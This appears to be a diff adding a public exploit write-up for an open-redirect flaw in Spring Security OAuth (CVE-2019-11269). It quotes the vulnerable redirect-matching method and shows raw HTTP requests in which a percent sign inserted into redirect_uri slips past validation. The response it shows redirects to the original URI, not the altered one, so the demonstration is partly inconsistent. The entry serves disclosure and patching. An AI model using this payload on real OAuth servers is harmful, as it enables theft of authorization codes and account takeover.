@@ -1,0 +1,75 @@
+# Exploit Title: Open Redirector in spring-security-oauth2
+# Date: 17 June 2019
+# Exploit Author: Riemann
+# Vendor Homepage: https://spring.io/projects/spring-security-oauth
+# Software Link: https://spring.io
+# Version: Spring Security OAuth versions 2.3 prior to 2.3.6 -org.springframework.security.oauth:spring-security-oauth2:2.3.3.RELEASE
+# Tested on: UBUNTU 16.04 LTS -org.springframework.security.oauth:spring-security-oauth2:2.3.3.RELEASE
+# CVE : CVE-2019-11269 | CVE-2019-3778
+
+# Description
+Spring Security OAuth versions 2.3 prior to 2.3.6, 2.2 prior to 2.2.5, 2.1 prior to 2.1.5, and 2.0 prior to 2.0.18, as well as older unsupported versions could be susceptible to an open redirector attack that can leak an authorization code. A malicious user or attacker can craft a request to the authorization endpoint using the authorization code grant type, and specify a manipulated redirection URI via the redirect_uri parameter. This can cause the authorization server to redirect the resource owner user-agent to a URI under the control of the attacker with the leaked authorization code.	
+
+
+#VULNERABILITY:
+By manipulating the REDIRECT_URI parameter, an attacker can actually bypass the validation.
+
+The code causing the vulnerability is found under the package org.springframework.security.oauth2.provider.endpoint
+The Class: DefaultRedirectResolver, which method obtainMatchingRedirect does not proper sanitation 
+
+/**
+	 * Attempt to match one of the registered URIs to the that of the requested one.
+	 * 
+	 * @param redirectUris the set of the registered URIs to try and find a match. This cannot be null or empty.
+	 * @param requestedRedirect the URI used as part of the request
+	 * @return the matching URI
+	 * @throws RedirectMismatchException if no match was found
+	 */
+	private String obtainMatchingRedirect(Set<String> redirectUris, String requestedRedirect) {
+		Assert.notEmpty(redirectUris, "Redirect URIs cannot be empty");
+
+		if (redirectUris.size() == 1 && requestedRedirect == null) {
+			return redirectUris.iterator().next();
+		}
+		for (String redirectUri : redirectUris) {
+			if (requestedRedirect != null && redirectMatches(requestedRedirect, redirectUri)) {
+				return requestedRedirect;
+			}
+		}
+		throw new RedirectMismatchException("Invalid redirect: " + requestedRedirect
+				+ " does not match one of the registered values: " + redirectUris.toString());
+	}
+
+
+#POC ATTACK VECTOR
+The following request done by the CLIENT APP after the user has logged in, contains  the REDIRECT_URI parameter. The validation is bypassed by simply adding a percentage sign which triggers a redirect instead of the RedirectMismatchException error
+
+The ORIGINAL REQUEST containing a valid URI:
+GET /auth/oauth/authorize?response_type=code&client_id=R2dpxQ3vPrtfgF72&scope=user_info&state=HPRbfRgJLWdmLMi9KXeLJDesMLfPC3vZ0viEkeIvGuQ%3D&redirect_uri=http://localhost:8086/login/oauth2/code/ HTTP/1.1
+
+The attacker then tricks the application by changing entirely the URI to another server adding a percentage for example:
+
+GET /auth/oauth/authorize?response_type=code&client_id=R2dpxQ3vPrtfgF72&scope=user_info&state=HPRbfRgJLWdmLMi9KXeLJDesMLfPC3vZ0viEkeIvGuQ%3D&redirect_uri=http://%localhost:9000/login/oauth2/code/ HTTP/1.1
+Host: localhost:8085
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:67.0) Gecko/20100101 Firefox/67.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://localhost:8085/auth/login
+Connection: close
+Cookie: JSESSIONID=3394FD89204BE407CB585881755C0828; JSESSIONID=C0F1D5A2F1944DCB43F2BFFA416B7A63
+Upgrade-Insecure-Requests: 1
+
+
+The RESPONSE indeed does not produce an expected OAUTH error  but redirects the user :
+
+HTTP/1.1 302 
+Cache-Control: no-store
+X-Content-Type-Options: nosniff
+X-XSS-Protection: 1; mode=block
+X-Frame-Options: DENY
+Location: http://localhost:8086/login/oauth2/code/?code=4ecsea&state=HPRbfRgJLWdmLMi9KXeLJDesMLfPC3vZ0viEkeIvGuQ%3D
+Content-Language: en-US
+Content-Length: 0
+Date: Mon, 17 Jun 2019 11:06:18 GMT
+Connection: close
